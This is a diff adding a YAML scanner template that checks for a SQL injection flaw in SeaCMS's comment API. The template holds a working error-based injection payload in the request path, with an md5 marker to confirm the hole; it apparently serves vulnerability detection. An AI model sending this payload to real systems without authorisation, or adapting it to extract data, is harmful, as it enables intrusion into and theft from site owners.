@@ -1,0 +1,21 @@
+id: poc-yaml-seacms-sqli
+info:
+  name: Seacms SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Seacms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "6f7c6dcbc380aac3bcba1f9fccec99")
+  output: []
